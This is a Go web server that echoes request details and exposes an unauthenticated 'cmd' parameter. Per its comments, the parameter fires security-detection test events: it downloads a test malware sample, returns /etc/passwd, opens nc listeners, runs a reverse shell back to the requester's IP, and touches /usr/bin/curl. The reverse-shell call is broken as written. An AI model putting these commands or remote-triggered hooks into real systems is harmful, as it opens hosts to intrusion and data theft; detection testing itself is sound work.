package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var visit_count int = 0

// Server to return info seen in the HTTP request
func WebInfoServer(w http.ResponseWriter, r *http.Request) {

	// count number of visitors since last restart
	visit_count += 1

	// show basic info in log
	log.Printf("Received request from %s for path: %s from %s", r.RemoteAddr, r.URL.Path, r.Header.Get("User-Agent"))

	if r.URL.Path == "/" {
		// show IP address of the client only if the requested URL is "/"
		get_sender_ip(w, r)
	} else if r.URL.Path == "/info" {
		// show more info about the request if the requested URL is "/info"
		print_req_info(w, r)
	} else {
		fmt.Fprintf(w, "Invalid URL")
	}

	// check whether query parameters exist
	if len(r.URL.RawQuery) > 0 {

		// sleep exists - sleep for the duration of the received value
		if sleep_duration_ms, err := strconv.Atoi(r.URL.Query().Get("sleep")); err == nil {
			delay_response(w, sleep_duration_ms)
		}

		// load exists - loop for the duration of the received value
		if load_duration_ms, err := strconv.Atoi(r.URL.Query().Get("load")); err == nil {
			add_load(w, load_duration_ms)
		}

		// data exists - return the amount of data specified
		if return_data_byte, err := strconv.Atoi(r.URL.Query().Get("data")); err == nil {
			return_http_data(w, return_data_byte)
		}

		// domain exists - lookup IP address of the domain name
		if domain_name := r.URL.Query().Get("domain"); len(domain_name) > 0 {
			lookup_domain(w, domain_name)
		}

		// cmd exists - run specific commands
		if cmd_opt := r.URL.Query().Get("cmd"); len(cmd_opt) > 0 {
			run_cmd(w, r, cmd_opt)
		}

		// req_hdr exists - return full HTTP request header
		if show_req_header, _ := strconv.ParseBool(r.URL.Query().Get("req_hdr")); show_req_header {
			fmt.Fprintf(w, "\nThe full request header is:\n")
			for key, value := range r.Header {
				for _, element := range value {
					fmt.Fprintf(w, "%s: %s\n", key, element)
				}
			}
			fmt.Fprintf(w, "\n")
		}
	}

}

// Get IP address of HTTP request sender
func get_sender_ip(w http.ResponseWriter, r *http.Request) string {

	var xff string = r.Header.Get("X-Forwarded-For")
	var requester_ip_port string = r.RemoteAddr

	if len(xff) > 0 {
		ips := strings.Split(xff, ", ")
		fmt.Fprintf(w, "%s", ips[0])
		return ips[0]
	} else {
		ip_port_slice := strings.Split(requester_ip_port, ":")
		fmt.Fprintf(w, "%s", strings.TrimSuffix(requester_ip_port, ":"+ip_port_slice[len(ip_port_slice)-1]))
		return strings.TrimSuffix(requester_ip_port, ":"+ip_port_slice[len(ip_port_slice)-1])
	}
}

// print more info about the request if the requested URL is "/info"
func print_req_info(w http.ResponseWriter, r *http.Request) {

	var user_agent string = r.Header.Get("User-Agent")
	var cookies string = r.Header.Get("Cookie")
	var requester_ip_port string = r.RemoteAddr
	var xff string = r.Header.Get("X-Forwarded-For")
	var xfh string = r.Header.Get("X-Forwarded-Host")
	var query string = r.URL.RawQuery

	// show visitor count since last restart
	fmt.Fprintf(w, "You are visitor number %d", visit_count)
	fmt.Fprintf(w, " since last restart\n\n")

	// show HTTP method
	fmt.Fprintf(w, "You requested to:\n%s\n\n", r.Method)

	// show HOST info
	if len(xfh) > 0 {
		fmt.Fprintf(w, "Your original request is for the host:\n%s\n\n", xfh)
	}

	// show URL requested
	fmt.Fprintf(w, "Your requested URL is:\n%s%s\n\n", r.Host, r.URL.Path)

	// show query
	if len(r.URL.RawQuery) > 0 {
		fmt.Fprintf(w, "Query in your request:\n%s\n\n", query)
	}

	// show source IP address of IP packet
	fmt.Fprintf(w, "Your request is from this IP address:\n%s\n\n", requester_ip_port)

	// show IP addresses of the client and intermediate nodes
	print_xff_ips(w, xff)

	// show cookie info
	if len(cookies) > 0 {
		fmt.Fprintf(w, "Your Cookies are:\n%s\n\n", cookies)
	}

	// show User-Agent info
	if len(user_agent) > 0 {
		fmt.Fprintf(w, "Your User-Agent is:\n%s\n\n", user_agent)
	}
}

// print IP addresses from XFF header
func print_xff_ips(w http.ResponseWriter, xff string) {

	if len(xff) > 0 {
		ips := strings.Split(xff, ", ")
		for i, ip := range ips {
			if i == 0 {
				fmt.Fprintf(w, "Your original IP address is:\n")
				fmt.Fprintf(w, "%s\n", ip)
			} else if i == 1 {
				fmt.Fprintf(w, "Your request is going through the following IP addresses:\n")
				fmt.Fprintf(w, "%s\n", ip)
			} else {
				fmt.Fprintf(w, "%s\n", ip)
			}
		}
		fmt.Fprintf(w, "\n")
	}
}

// delay reponse to HTTP request by sleeping for a duration specified by the sleep parameter
func delay_response(w http.ResponseWriter, sleep_duration_ms int) {

	fmt.Fprintf(w, "\n===== processing sleep parameter =====\n")
	fmt.Fprintf(w, "Sleeping for %v ms\n", sleep_duration_ms)
	time.Sleep(time.Duration(sleep_duration_ms) * time.Millisecond)
}

// add load when processing the HTTP request for a duration specified by the load parameter
func add_load(w http.ResponseWriter, load_duration_ms int) {

	var i int64 = 0

	fmt.Fprintf(w, "\n===== processing load parameter =====\n")
	fmt.Fprintf(w, "Consuming CPU for %v ms\n", load_duration_ms)
	for start := time.Now(); time.Since(start) < (time.Duration(load_duration_ms) * time.Millisecond); {
		i++
	}
}

// return the amount of data specified by the data parameter
func return_http_data(w http.ResponseWriter, return_data_byte int) {

	const a byte = 'a'

	fmt.Fprintf(w, "\n===== processing data parameter =====\n")
	fmt.Fprintf(w, "Packing %v bytes of data\n", return_data_byte)
	web_data := make([]byte, return_data_byte)
	for i := range web_data {
		web_data[i] = a
	}
	fmt.Fprintf(w, "%s\n", string(web_data))
}

// lookup domain name based on the value of the domain parameter
func lookup_domain(w http.ResponseWriter, domain_name string) {

	ips, err := net.LookupIP(domain_name)
	fmt.Fprintf(w, "\n===== processing domain parameter =====\n")
	fmt.Fprintf(w, "Looking up domain: %v\n", domain_name)
	if err == nil {
		for _, ip := range ips {
			fmt.Fprintf(w, "%v resolves to %v\n", domain_name, ip)
		}
	} else {
		fmt.Fprintf(w, "domain lookup error: %v\n", err)
	}
}

// run command based on the value of the cmd parameter
func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {

	fmt.Fprintf(w, "\n===== processing cmd parameter =====\n")

	switch cmd_opt {

	case "download":
		// run curl command to download sample malware file and trigger unexpected process, DNS, file system access and malware event
		cmd_out, err := exec.Command("curl", "http://sg.wildfire.paloaltonetworks.com/publicapi/test/elf", "-o", "/tmp/malware-sample").Output()
		fmt.Fprintf(w, "Running command \"curl http://sg.wildfire.paloaltonetworks.com/publicapi/test/elf\"\n")
		if err == nil {
			fmt.Fprintf(w, "%s\n", cmd_out)
		} else {
			fmt.Fprintf(w, "%s\n", err)
		}
	case "leak":
		// run cat /etc/passwd to trigger information leakage event
		cmd_out, err := exec.Command("cat", "/etc/passwd").Output()
		fmt.Fprintf(w, "Running command \"cat /etc/passwd\"\n")
		if err == nil {
			fmt.Fprintf(w, "%s\n", cmd_out)
		} else {
			fmt.Fprintf(w, "%s\n", err)
		}
	case "listen":
		// listen to tcp port 11111 to trigger unexpected listening port event

		var sleep_duration int = 15

		listener, err := net.Listen("tcp4", ":11111")
		if err != nil {
			log.Printf("Error listening: %s\n", err)
			fmt.Fprintf(w, "Error listening: %s\n", err)
			return
		}

		defer listener.Close()

		// connect to the listen after sleep_duration
		go func() {
			time.Sleep(time.Duration(sleep_duration) * time.Second)

			var d net.Dialer
			ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
			defer cancel()

			conn, err := d.DialContext(ctx, "tcp", "localhost:11111")
			if err != nil {
				log.Printf("Failed to dial: %v\n", err)
				fmt.Fprintf(w, "Failed to dial: %v\n", err)
				return
			}
			defer conn.Close()

			time.Sleep(time.Duration(sleep_duration) * time.Second)

			if _, err := conn.Write([]byte("This is a test!")); err != nil {
				log.Printf("Failed to send data: %v\n", err)
				fmt.Fprintf(w, "Failed to send data: %v\n", err)
				return
			}
		}()

		// comment out the for loop as no concurrent connection support is required
		//for {
		log.Printf("Waiting for connection at %v\n", listener.Addr())
		fmt.Fprintf(w, "Waiting for connection at %v\n", listener.Addr())
		conn, err := listener.Accept()

		defer conn.Close()

		if err != nil {
			log.Printf("Error accepting: %s\n", err)
			fmt.Fprintf(w, "Error accepting: %s\n", err)
			return
		}
		log.Printf("Accepted connection from %v\n", conn.RemoteAddr())
		fmt.Fprintf(w, "Accepted connection from %v\n", conn.RemoteAddr())

		// comment out goroutine as no concurrent connection support is required
		//go func(c net.Conn) {
		time.Sleep(time.Duration(sleep_duration)*time.Second + 1)
		conn.Close()
		log.Printf("Closing connection\n")
		//}(conn)
		//}

	case "nc":
		// run nc command to trigger unexpected listening port event
		ctx_duration := 30 * time.Second
		tcp_port := "11111"

		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
		defer cancel()

		cmd_out, err := exec.CommandContext(ctx, "nc", "-lvp", tcp_port).Output()
		fmt.Fprintf(w, "Running command \"nc -lvp %s\"\n", tcp_port)
		if err == nil {
			fmt.Fprintf(w, "%s\n", cmd_out)
		} else {
			fmt.Fprintf(w, "%s\n", err)
		}

	case "reverse":
		// initiate a reverse shell command to trigger reverse shell event
		ctx_duration := 30 * time.Second
		dest_ip := get_sender_ip(w, r)

		tcp_port := "11111"

		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
		defer cancel()

		cmd_out, err := exec.CommandContext(ctx, "rm", "-f", "/tmp/f", ";", "mknod", "/tmp/f", "p", ";", "cat", "/tmp/f", "|", "/bin/sh", "-i", "2>&1", "|", "nc", dest_ip, tcp_port, ">", "/tmp/f").Output()
		fmt.Fprintf(w, "Running command \"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s "+"> /tmp/f\"\n", dest_ip, tcp_port)
		if err == nil {
			fmt.Fprintf(w, "%s\n", cmd_out)
		} else {
			fmt.Fprintf(w, "%s\n", err)
		}

	case "modified":
		// touch a binary and run it to trigger modified binary event
		cmd_out, err := exec.Command("touch", "/usr/bin/curl").Output()
		fmt.Fprintf(w, "Running command \"touch /usr/bin/curl\"\n")
		if err == nil {
			fmt.Fprintf(w, "%s\n", cmd_out)
		} else {
			fmt.Fprintf(w, "%s\n", err)
		}
		cmd_out, err = exec.Command("curl").Output()
		fmt.Fprintf(w, "Running command \"curl\"\n")
		if err == nil {
			fmt.Fprintf(w, "%s\n", cmd_out)
		} else {
			fmt.Fprintf(w, "%s\n", err)
		}
	default:
		fmt.Fprintf(w, "Invalid value: %s\n", cmd_opt)
	}
}

func main() {

	var addr string = ":80"
	handler := http.HandlerFunc(WebInfoServer)

	log.Printf("Starting webserver on %s", addr)
	if err := http.ListenAndServe(addr, handler); err != nil {
		log.Fatalf("Could not listen on port %s %v", addr, err)
	}
}
